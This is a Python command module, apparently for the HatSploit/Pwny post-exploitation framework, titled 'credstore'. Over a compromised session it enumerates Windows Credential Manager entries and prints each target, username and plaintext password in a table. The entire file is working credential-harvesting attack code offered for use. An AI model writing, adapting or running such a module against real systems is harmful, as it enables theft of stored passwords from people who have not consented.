"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

CREDSTORE_BASE = 17

CREDSTORE_LIST = tlv_custom_tag(API_CALL_STATIC, CREDSTORE_BASE, API_CALL)

TLV_TYPE_CRED_TARGET = tlv_custom_type(TLV_TYPE_STRING, CREDSTORE_BASE, API_TYPE)
TLV_TYPE_CRED_USER = tlv_custom_type(TLV_TYPE_STRING, CREDSTORE_BASE, API_TYPE + 1)
TLV_TYPE_CRED_PASS = tlv_custom_type(TLV_TYPE_STRING, CREDSTORE_BASE, API_TYPE + 2)
TLV_TYPE_CRED_COMMENT = tlv_custom_type(TLV_TYPE_STRING, CREDSTORE_BASE, API_TYPE + 3)
TLV_TYPE_CRED_TYPE = tlv_custom_type(TLV_TYPE_INT, CREDSTORE_BASE, API_TYPE)
TLV_TYPE_CRED_GROUP = tlv_custom_type(TLV_TYPE_GROUP, CREDSTORE_BASE, API_TYPE)

CRED_TYPE_NAMES = {
    1: 'Generic',
    2: 'Domain',
    3: 'Certificate',
    4: 'Visible',
}


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "credstore",
            'Authors': [
                'EntySec - command developer',
            ],
            'Description': "Enumerate Windows Credential Manager entries.",
        })

    def run(self, _):
        result = self.session.send_command(tag=CREDSTORE_LIST)

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to enumerate credentials!")
            return

        headers = ('Target', 'Type', 'Username', 'Password', 'Comment')
        data = []

        while True:
            entry = result.get_tlv(TLV_TYPE_CRED_GROUP)
            if entry is None:
                break

            target = entry.get_string(TLV_TYPE_CRED_TARGET) or ''
            user = entry.get_string(TLV_TYPE_CRED_USER) or ''
            password = entry.get_string(TLV_TYPE_CRED_PASS) or ''
            comment = entry.get_string(TLV_TYPE_CRED_COMMENT) or ''
            cred_type = entry.get_int(TLV_TYPE_CRED_TYPE) or 0
            type_name = CRED_TYPE_NAMES.get(cred_type, f'Unknown({cred_type})')

            data.append((target, type_name, user, password, comment))

        if not data:
            self.print_warning("No credentials found.")
            return

        self.print_table("Credentials", headers, *data)
